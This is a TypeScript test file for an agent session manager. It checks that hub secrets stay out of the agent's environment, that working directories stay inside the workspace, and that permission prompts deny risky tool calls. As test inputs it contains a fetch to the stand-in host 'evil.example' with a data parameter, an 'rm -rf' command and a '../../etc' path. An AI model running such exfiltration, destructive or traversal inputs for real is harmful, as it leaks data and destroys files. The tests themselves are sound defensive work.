import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { mkdirSync, mkdtempSync, readFileSync, realpathSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import type { AgentToHubMessage, ManagedMcpServer } from '@remote-harness/shared';
import { SessionManager } from '../src/sessionManager.ts';

// A stand-in for the SDK's query(): records the options it was given and ends immediately.
function fakeQuery() {
  const calls: any[] = [];
  const query = ((args: any) => {
    calls.push(args.options);
    return {
      [Symbol.asyncIterator]: async function* () {},
      interrupt: async () => {},
      setPermissionMode: async () => {},
      setModel: async () => {},
      applyFlagSettings: async () => {},
      setMcpServers: async () => {},
      mcpServerStatus: async () => [],
      close: () => {},
    };
  }) as never;
  return { calls, query };
}

const make = (opts: Record<string, unknown> = {}) => {
  const sent: AgentToHubMessage[] = [];
  const dir = realpathSync(mkdtempSync(join(tmpdir(), 'sm-test-')));
  const fq = fakeQuery();
  const manager = new SessionManager(dir, join(dir, 'data'), [{ id: 'default', label: 'default' }], (m) => sent.push(m), { query: fq.query, ...opts } as never);
  return { manager, sent, dir, calls: fq.calls };
};
const start = (m: SessionManager, text = 'hi') => m.handleUserInput({ type: 'user_input', sessionId: 't1', tempId: 't1', text });

describe('SessionManager', () => {
  it('reports an error for an unknown session id instead of silently starting a fresh conversation', () => {
    const { manager, sent, calls } = make();
    manager.handleUserInput({ type: 'user_input', sessionId: 'not-a-known-session', text: 'hi' });
    assert.equal(sent.length, 1);
    assert.equal(sent[0].type, 'error');
    assert.match((sent[0] as { message: string }).message, /unknown session/i);
    assert.equal(calls.length, 0, 'no conversation may be started');
    assert.deepEqual(manager.summaries(), []);
  });

  it('only uses the MCP servers the hub installed: a repo\'s own .mcp.json is ignored (strictMcpConfig)', () => {
    const { manager, calls } = make();
    start(manager);
    assert.equal(calls[0].strictMcpConfig, true);
  });

  it('never hands the hub credentials to the Claude process, with or without an account profile', () => {
    process.env.HUB_TOKEN = 'tenant-wide-secret';
    process.env.HUB_URL = 'wss://hub.example/agent';
    try {
      const a = make();
      start(a.manager);
      assert.equal('HUB_TOKEN' in (a.calls[0].env ?? {}), false);
      assert.equal('HUB_URL' in (a.calls[0].env ?? {}), false);
      assert.ok(a.calls[0].env?.PATH, 'the rest of the environment is still there');

      const sent: AgentToHubMessage[] = [];
      const dir = mkdtempSync(join(tmpdir(), 'sm-test-'));
      const fq = fakeQuery();
      const m = new SessionManager(dir, dir, [{ id: 'work', label: 'work', configDir: join(dir, 'cfg') }], (x) => sent.push(x), { query: fq.query } as never);
      start(m);
      assert.equal('HUB_TOKEN' in (fq.calls[0].env ?? {}), false);
      assert.equal(fq.calls[0].env.CLAUDE_CONFIG_DIR, join(dir, 'cfg'));
    } finally {
      delete process.env.HUB_TOKEN;
      delete process.env.HUB_URL;
    }
  });

  it('keeps a new session\'s working directory inside the workspace', () => {
    const { manager, calls, dir } = make();
    manager.handleUserInput({ type: 'user_input', sessionId: 't1', tempId: 't1', text: 'hi', cwd: '../../etc' });
    assert.equal(calls[0].cwd, dir);
  });

  it('in a managed worker, the agent\'s own files and WebFetch still ask; ordinary work does not', async () => {
    const { manager, sent, calls, dir } = make({ managed: true, protectedPaths: ['/opt/agent'] });
    start(manager);
    const canUse = calls[0].canUseTool as (tool: string, input: Record<string, unknown>, o: { signal: AbortSignal }) => Promise<{ behavior: string }>;
    const signal = new AbortController().signal;
    assert.equal((await canUse('Bash', { command: 'ls' }, { signal })).behavior, 'allow');
    assert.equal((await canUse('Write', { file_path: join(dir, 'a.txt') }, { signal })).behavior, 'allow');

    const pending = canUse('WebFetch', { url: 'https://evil.example/?d=x' }, { signal });
    await new Promise((r) => setTimeout(r, 20));
    const req = sent.find((m) => m.type === 'permission_request') as { requestId: string; toolName: string };
    assert.equal(req.toolName, 'WebFetch');
    manager.resolvePermission(req.requestId, 'deny');
    assert.equal((await pending).behavior, 'deny');

    const pending2 = canUse('Write', { file_path: '/opt/agent/src/index.ts' }, { signal });
    await new Promise((r) => setTimeout(r, 20));
    assert.ok(sent.filter((m) => m.type === 'permission_request').length >= 2, "writing the agent's own code asks");
    const req2 = sent.filter((m) => m.type === 'permission_request').at(-1) as { requestId: string };
    manager.resolvePermission(req2.requestId, 'deny');
    await pending2;
  });

  it('does not install a hub-pushed MCP server whose name collides with another\'s tool namespace', async () => {
    const { manager, calls } = make();
    const mk = (name: string): ManagedMcpServer => ({ name, url: 'https://x.example/', autoAllow: true, updatedAt: '' });
    await manager.setMcpServers([mk('good'), mk('a__b')]);
    start(manager);
    assert.deepEqual(Object.keys(calls[0].mcpServers), ['good']);
  });

  it('answers a pending permission card with a denial when its session ends, and prunes it', async () => {
    const { manager, sent, calls } = make();
    start(manager);
    const canUse = calls[0].canUseTool as (tool: string, input: Record<string, unknown>, o: { signal: AbortSignal }) => Promise<{ behavior: string }>;
    const p = canUse('Bash', { command: 'rm -rf x' }, { signal: new AbortController().signal });
    await new Promise((r) => setTimeout(r, 50)); // the (empty) fake session ends immediately
    const verdict = await Promise.race([p, new Promise((r) => setTimeout(() => r('HUNG'), 500))]);
    assert.deepEqual(typeof verdict === 'object' ? (verdict as { behavior: string }).behavior : verdict, 'deny');
    assert.ok(sent.some((m) => m.type === 'session_ended'));
  });

  it('reports a rejected model switch to the phone instead of crashing the agent', async () => {
    // The SDK rejects set_model for a model id its catalog doesn't know; an unhandled rejection used to kill the process.
    let release!: () => void;
    const held = new Promise<void>((r) => { release = r; });
    const fail = async () => { throw new Error('"claude-x" isn\'t described by this version\'s model catalog'); };
    const query = (() => ({
      [Symbol.asyncIterator]: async function* () { await held; },
      interrupt: fail, setPermissionMode: fail, setModel: fail, applyFlagSettings: fail,
      setMcpServers: async () => {}, mcpServerStatus: async () => [], close: () => {},
    })) as never;
    const sent: AgentToHubMessage[] = [];
    const dir = realpathSync(mkdtempSync(join(tmpdir(), 'sm-test-')));
    const manager = new SessionManager(dir, join(dir, 'data'), [{ id: 'default', label: 'default' }], (m) => sent.push(m), { query } as never);
    const unhandled: unknown[] = [];
    const onUnhandled = (e: unknown) => unhandled.push(e);
    process.on('unhandledRejection', onUnhandled);
    try {
      start(manager);
      manager.setModel('t1', 'claude-x');
      manager.setEffort('t1', 'high');
      manager.setPermissionMode('t1', 'default');
      manager.interrupt('t1');
      await new Promise((r) => setTimeout(r, 50));
      assert.deepEqual(unhandled, []);
      const errors = sent.filter((m) => m.type === 'error') as { message: string; sessionId?: string }[];
      assert.equal(errors.length, 4);
      assert.match(errors[0].message, /model catalog/);
    } finally {
      process.off('unhandledRejection', onUnhandled);
      release();
    }
  });

  describe('a chat keeps its mode, model and effort', () => {
    // A query that says who it is (init), records what was asked of it, and stays open until released.
    function recordingQuery(sessionId = 'real-1') {
      const calls: any[] = [];
      const controls: string[] = [];
      let release!: () => void;
      const held = new Promise<void>((r) => { release = r; });
      const query = ((args: any) => {
        calls.push(args.options);
        return {
          [Symbol.asyncIterator]: async function* () {
            yield { type: 'system', subtype: 'init', session_id: args.options.resume ?? sessionId };
            await held;
          },
          interrupt: async () => {},
          setPermissionMode: async (m: string) => { controls.push(`mode:${m}`); },
          setModel: async (m?: string) => { controls.push(`model:${m}`); },
          applyFlagSettings: async (f: unknown) => { controls.push(`flags:${JSON.stringify(f)}`); },
          setMcpServers: async () => {},
          mcpServerStatus: async () => [],
          close: () => {},
        };
      }) as never;
      return { calls, controls, query, release: () => release() };
    }
    const tick = () => new Promise((r) => setTimeout(r, 20));
    const managerWith = (dir: string, query: never) => new SessionManager(dir, join(dir, 'data'), [{ id: 'default', label: 'default' }], () => {}, { query } as never);

    it('a new chat starts with what came with its first message, and remembers it once named', async () => {
      const dir = realpathSync(mkdtempSync(join(tmpdir(), 'sm-choices-')));
      const q = recordingQuery();
      const m = managerWith(dir, q.query);
      m.handleUserInput({ type: 'user_input', sessionId: 't1', tempId: 't1', text: 'hi', permissionMode: 'auto', model: 'claude-opus-4-8', effort: 'high' });
      await tick();
      assert.equal(q.calls[0].permissionMode, 'auto');
      assert.equal(q.calls[0].effort, 'high');
      assert.deepEqual(q.controls, ['model:claude-opus-4-8']);
      const saved = JSON.parse(readFileSync(join(dir, 'data', 'sessions.json'), 'utf-8'))[0];
      assert.deepEqual([saved.sessionId, saved.permissionMode, saved.model, saved.effort], ['real-1', 'auto', 'claude-opus-4-8', 'high']);
      q.release();
    });

    it('a change made while the chat is not running is kept, and the chat resumes with it', async () => {
      const dir = realpathSync(mkdtempSync(join(tmpdir(), 'sm-choices-')));
      mkdirSync(join(dir, 'data'), { recursive: true });
      writeFileSync(join(dir, 'data', 'sessions.json'), JSON.stringify([{ sessionId: 's1', cwd: dir, title: 'x', createdAt: 'now', accountId: 'default' }]));
      const q = recordingQuery();
      const m = managerWith(dir, q.query);
      // Not running: these used to be dropped, and the next message resumed the chat with the defaults.
      m.setPermissionMode('s1', 'acceptEdits');
      m.setEffort('s1', 'max');
      m.setModel('s1', 'claude-sonnet-5');
      m.handleUserInput({ type: 'user_input', sessionId: 's1', text: 'carry on' });
      await tick();
      assert.equal(q.calls[0].resume, 's1');
      assert.equal(q.calls[0].permissionMode, 'acceptEdits');
      assert.equal(q.calls[0].effort, 'max');
      assert.deepEqual(q.controls, ['model:claude-sonnet-5']);
      q.release();
    });

    it('what comes with a message wins over what was kept; bypass is switched to once running', async () => {
      const dir = realpathSync(mkdtempSync(join(tmpdir(), 'sm-choices-')));
      mkdirSync(join(dir, 'data'), { recursive: true });
      writeFileSync(join(dir, 'data', 'sessions.json'), JSON.stringify([{ sessionId: 's1', cwd: dir, title: 'x', createdAt: 'now', accountId: 'default', permissionMode: 'plan', model: 'claude-x', effort: 'low' }]));
      const q = recordingQuery();
      const m = managerWith(dir, q.query);
      m.handleUserInput({ type: 'user_input', sessionId: 's1', text: 'go', permissionMode: 'bypassPermissions', model: '', effort: null });
      await tick();
      assert.equal(q.calls[0].permissionMode, 'default', 'bypass needs the opt-in, so it is not a start option');
      assert.equal('effort' in q.calls[0], false);
      assert.deepEqual(q.controls, ['mode:bypassPermissions']);
      const saved = JSON.parse(readFileSync(join(dir, 'data', 'sessions.json'), 'utf-8'))[0];
      assert.deepEqual([saved.permissionMode, saved.model, saved.effort], ['bypassPermissions', '', null]);
      q.release();
    });

    it('with nothing sent and nothing kept, a resumed chat runs as before (default mode)', async () => {
      const dir = realpathSync(mkdtempSync(join(tmpdir(), 'sm-choices-')));
      mkdirSync(join(dir, 'data'), { recursive: true });
      writeFileSync(join(dir, 'data', 'sessions.json'), JSON.stringify([{ sessionId: 's1', cwd: dir, title: 'x', createdAt: 'now', accountId: 'default' }]));
      const q = recordingQuery();
      const m = managerWith(dir, q.query);
      m.handleUserInput({ type: 'user_input', sessionId: 's1', text: 'go' });
      await tick();
      assert.equal(q.calls[0].permissionMode, 'default');
      assert.equal('effort' in q.calls[0], false);
      assert.deepEqual(q.controls, []);
      q.release();
    });
  });
});

